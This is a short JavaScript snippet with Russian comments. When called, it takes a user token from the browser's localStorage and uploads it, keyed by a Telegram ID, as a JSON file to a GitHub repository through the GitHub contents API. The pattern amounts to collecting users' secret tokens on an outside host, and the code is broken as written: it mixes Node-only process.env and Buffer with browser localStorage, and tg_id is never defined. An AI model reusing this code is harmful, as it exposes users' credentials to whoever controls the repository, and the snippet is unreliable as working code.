
const githubToken = process.env.GITHUB_TOKEN; // Получаем из переменной окружения
const repoOwner = process.env.REPO_OWNER; // Получаем из переменной окружения
const repoName = process.env.REPO_NAME; // Получаем из переменной окружения

async function saveToGitHub() {
    try {
        // Проверяем наличие секретов
        if (!githubToken || !repoOwner || !repoName) {
            throw new Error("Один или несколько секретов не заданы");
        }

        // Получаем токен из localStorage
        const userToken = localStorage.getItem('userToken');

        // Проверяем условия
        if (!tg_id || !userToken || tg_id === "0" || userToken === "0") {
            console.log("Одна или обе переменные равны 0 или отсутствуют");
            return;
        }

        // Формируем данные для JSON
        const data = {
            token: userToken
        };

        // Формируем путь к файлу
        const filePath = `${tg_id}.json`;
        const content = Buffer.from(JSON.stringify(data, null, 2)).toString('base64');

        // Проверяем существование файла
        let sha = null;
        try {
            const response = await fetch(
                `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`,
                {
                    method: 'GET',
                    headers: {
                        'Authorization': `token ${githubToken}`,
                        'Accept': 'application/vnd.github.v3+json'
                    }
                }
            );

            if (response.ok) {
                const fileData = await response.json();
                sha = fileData.sha;
            }
        } catch (error) {
            // Файл не существует, продолжаем создание нового
        }

        // Сохраняем или обновляем файл
        const response = await fetch(
            `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`,
            {
                method: 'PUT',
                headers: {
                    'Authorization': `token ${githubToken}`,
                    'Accept': 'application/vnd.github.v3+json'
                },
                body: JSON.stringify({
                    message: `Update ${filePath}`,
                    content: content,
                    sha: sha
                })
            }
        );

        if (response.ok) {
            console.log(`Файл ${filePath} успешно сохранен в репозитории`);
        } else {
            console.error('Ошибка при сохранении файла:', await response.text());
        }
    } catch (error) {
        console.error('Произошла ошибка:', error);
    }
}

// Вызываем функцию
saveToGitHub();